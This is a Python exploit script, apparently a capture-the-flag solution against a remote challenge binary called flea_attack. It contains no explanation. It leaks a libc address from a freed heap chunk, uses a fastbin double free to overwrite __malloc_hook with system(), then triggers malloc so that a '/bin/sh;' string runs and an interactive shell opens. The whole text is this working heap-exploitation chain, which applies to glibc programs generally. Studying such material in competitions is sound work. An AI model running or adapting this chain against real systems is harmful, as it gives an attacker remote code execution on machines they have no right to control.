from yeonnic import *

context.arch="amd64"
elf=ELF("./flea_attack.elf")
libc=ELF("./libc.so.6")

#p=process("./flea_attack.elf")
p=remote("problem.harekaze.com", 20175)


def create_name(size,name):
    p.sendline("1")
    print p.recv()
    p.sendline(str(size))
    print p.recv()
    p.sendline(name)
    print p.recvuntil("Addr: ")
    addr=int(p.recvline().strip(),16)
    print p.recv()
    return addr


def delete_name(ptr):
    p.sendline("2")
    print p.recv()
    p.sendline(hex(ptr))
    print p.recv()

gdb_attach(p, "tracemalloc on\nc")

print p.recv()
p.sendline("/bin/sh;")
print p.recv()

a = create_name(0x100,"A")

name_1 = create_name(0x68, "A")
name_2 = create_name(0x68, "A")

delete_name(a)
p.sendline("1")
print p.recv()
p.sendline(str(0x100))
print p.recv()
p.sendline("A"*6+"B")
print p.recvuntil("AB\n")
libc_base = u64(p.recv(6).ljust(8,"\x00"))-0x3c4b78
libc.address=libc_base
system = libc.symbols['system']
malloc_hook = libc.symbols['__malloc_hook'] - 0x23


print "name1 -> ", hex(name_1)
print "name2 -> ", hex(name_2)
print "libc_base -> " ,hex(libc_base)

delete_name(name_1)
delete_name(name_2)
delete_name(name_1)

create_name(0x68, p64(malloc_hook))
create_name(0x68, p64(malloc_hook))
create_name(0x68, p64(malloc_hook))
create_name(0x68, "AAA"+flat(system,system,system))

p.sendline("1")
print p.recv()
p.sendline(str(elf.symbols['comment']))


p.interactive()
